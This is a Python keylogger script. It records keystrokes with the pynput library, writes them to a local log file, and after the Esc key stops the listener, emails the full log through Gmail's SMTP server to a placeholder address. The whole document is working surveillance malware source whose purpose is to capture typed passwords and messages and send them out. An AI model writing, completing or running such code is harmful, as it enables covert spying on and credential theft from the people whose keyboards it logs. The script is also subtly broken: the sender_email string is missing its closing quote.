

from pynput.keyboard import Key, Listener
import smtplib,ssl

count=0
keys=[]


def on_press(key):

    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    if count >= 10:
        count=0
        write_file(keys)
        keys=[]

def write_file(keys):

    with open("log.txt", 'a') as f:

        for key in keys:

            k = str(key).replace("'", "")
            if k == "Key.space" or k == "Key.enter":
               f.write('\n')
            elif k.find("backspace") > -1:
                f.write("\n Backspace is pressed\n")
            elif k.find("<96>") > -1:
                f.write(str("0"))
            elif k.find("<97>") > -1:
                f.write(str("1"))
            elif k.find("<98>")>-1:
                f.write(str("2"))
            elif k.find("<99>")>-1:
                f.write(str("3"))
            elif k.find("<100>")>-1:
                f.write(str("4"))
            elif k.find("<101>")>-1:
                f.write(str("5"))
            elif k.find("<102>")>-1:
                f.write(str("6"))
            elif k.find("<103>")>-1:
                f.write(str("7"))
            elif k.find("<104>")>-1:
                f.write(str("8"))
            elif k.find("<105>")>-1:
                f.write(str("9"))
            elif k.find('key') == -1:
              f.write(k)



def on_release(key):
    if key==Key.esc:
        return False


with Listener(on_press= on_press, on_release= on_release) as listener:
    listener.join()

with open("log.txt",'r') as f:
    message=''
    temp=f.read();
    message = message +str(temp)
    f.close()

smtp_server="smtp.gmail.com"
port=587
sender_email="senderemail@example.com
password='your_password'
reciever_email='receiveremail@example.com'
context= ssl.create_default_context()

server= smtplib.SMTP(smtp_server,port)
server.ehlo()
server.starttls(context= context)
server.ehlo()
server.login(sender_email,password)
server.sendmail(sender_email,reciever_email, message)
server.quit()
